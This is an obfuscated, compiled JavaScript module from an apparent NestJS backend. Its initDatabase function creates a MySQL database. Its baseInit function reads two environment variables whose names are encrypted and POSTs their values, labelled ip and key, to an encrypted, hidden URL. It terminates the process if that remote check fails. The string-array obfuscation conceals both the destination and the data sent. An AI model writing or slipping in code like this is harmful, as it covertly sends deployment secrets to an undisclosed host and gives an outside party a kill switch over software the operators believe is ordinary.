'use strict';function _0x172e(){const _0x4d951c=['394318ZYAEBR','2516496jytKUB','log','execute','POST','decrypt','length','A2Fsf300ex6lg9HKrZuU6w==','Logger','initDatabase','7uEPvcF','defineProperty','Z5Gj+GyXcRW3J2uKxpiK/A==','24642OxonQS','nine','334590xnePtk','DB_PORT','exit','end','go9H7ImLajiXr5Q6OnWvfurll4vEO8bwz0SPaBPiw0HPXT7/s/P1OcqJE7hEQDq3','isArray','DB_DATABASE','includes','data','DB_HOST','isomorphic-fetch','322852Nwzfst','stringify','@nestjs/common','1010886kHvMnW','error','SHOW\x20DATABASES\x20LIKE\x20\x27','env','895092HWpSPj','12YJqMbh','1UDKbnj','260VBYcnY','mysql2/promise','then','../../common/utils','baseInit','json','__esModule','DB_USER'];_0x172e=function(){return _0x4d951c;};return _0x172e();}const _0x3c1348=_0xda5a;(function(_0x41a67e,_0x59d83c){const _0x25280a=_0xda5a,_0x3766b7=_0x41a67e();while(!![]){try{const _0x49eb58=-parseInt(_0x25280a(0x1bc))/0x1*(parseInt(_0x25280a(0x1c5))/0x2)+-parseInt(_0x25280a(0x1bb))/0x3*(-parseInt(_0x25280a(0x1b3))/0x4)+-parseInt(_0x25280a(0x1a8))/0x5+parseInt(_0x25280a(0x1b6))/0x6*(-parseInt(_0x25280a(0x1a3))/0x7)+parseInt(_0x25280a(0x1c6))/0x8+-parseInt(_0x25280a(0x1a6))/0x9*(parseInt(_0x25280a(0x1bd))/0xa)+parseInt(_0x25280a(0x1ba))/0xb;if(_0x49eb58===_0x59d83c)break;else _0x3766b7['push'](_0x3766b7['shift']());}catch(_0x518e56){_0x3766b7['push'](_0x3766b7['shift']());}}}(_0x172e,0x34800));Object[_0x3c1348(0x1a4)](exports,_0x3c1348(0x1c3),{'value':!![]}),exports[_0x3c1348(0x1c1)]=exports['initDatabase']=void 0x0;const mysql=require(_0x3c1348(0x1be)),common_1=require(_0x3c1348(0x1b5)),fetch=require(_0x3c1348(0x1b2)),utils_1=require(_0x3c1348(0x1c0));function initDatabase(){const _0x1ca83c=_0x3c1348;mysql['createConnection']({'host':process[_0x1ca83c(0x1b9)][_0x1ca83c(0x1b1)],'user':process[_0x1ca83c(0x1b9)][_0x1ca83c(0x1c4)],'password':process[_0x1ca83c(0x1b9)]['DB_PASS'],'port':parseInt(process[_0x1ca83c(0x1b9)][_0x1ca83c(0x1a9)])})[_0x1ca83c(0x1bf)](async _0xfd33a2=>{const _0x445748=_0x1ca83c,[_0x69c6a1]=await _0xfd33a2[_0x445748(0x1c8)](_0x445748(0x1b8)+process['env']['DB_DATABASE']+'\x27');Array[_0x445748(0x1ad)](_0x69c6a1)&&_0x69c6a1[_0x445748(0x1cb)]===0x0&&(await _0xfd33a2[_0x445748(0x1c8)]('CREATE\x20DATABASE\x20'+process[_0x445748(0x1b9)][_0x445748(0x1ae)]),common_1[_0x445748(0x1a1)][_0x445748(0x1c7)]((0x0,utils_1[_0x445748(0x1ca)])('Ap3mlSNYaf9hCKV1xUzmNrDhzl0yW2WRhBNqeZpjT5OQdKvLMy6+ZYT4hhvu5dPDAEDug32yM3J8F50XxP8CbA==')+'['+process[_0x445748(0x1b9)][_0x445748(0x1ae)]+']')),await _0xfd33a2[_0x445748(0x1ab)]();});}exports[_0x3c1348(0x1a2)]=initDatabase;async function baseInit(){const _0x4f2ba4=_0x3c1348,_0x10a37a=process['env'][(0x0,utils_1['decrypt'])(_0x4f2ba4(0x1a0))],_0x3216ba=process[_0x4f2ba4(0x1b9)][(0x0,utils_1[_0x4f2ba4(0x1ca)])(_0x4f2ba4(0x1a5))];if([0x13,0x16]['includes'](_0x3216ba['length'])||_0x3216ba[_0x4f2ba4(0x1af)](_0x4f2ba4(0x1a7))){const _0x16d156={'ip':_0x10a37a,'key':_0x3216ba},_0x3ccc12={'method':_0x4f2ba4(0x1c9),'headers':{'Content-Type':'application/json'},'body':JSON[_0x4f2ba4(0x1b4)](_0x16d156)},_0x554391=(0x0,utils_1[_0x4f2ba4(0x1ca)])(_0x4f2ba4(0x1ac));try{const _0x223275=await fetch(_0x554391,_0x3ccc12),_0x430c24=await _0x223275[_0x4f2ba4(0x1c2)](),{success:_0x266841,message:_0x48742b}=_0x430c24[_0x4f2ba4(0x1b0)];!_0x266841&&(common_1['Logger'][_0x4f2ba4(0x1b7)](_0x48742b),process[_0x4f2ba4(0x1aa)](0x1));}catch(_0x2afbf4){}}else process[_0x4f2ba4(0x1aa)](0x1);}function _0xda5a(_0x18ce6d,_0x336573){const _0x172e3f=_0x172e();return _0xda5a=function(_0xda5af4,_0x40c532){_0xda5af4=_0xda5af4-0x1a0;let _0x17b3d8=_0x172e3f[_0xda5af4];return _0x17b3d8;},_0xda5a(_0x18ce6d,_0x336573);}exports[_0x3c1348(0x1c1)]=baseInit;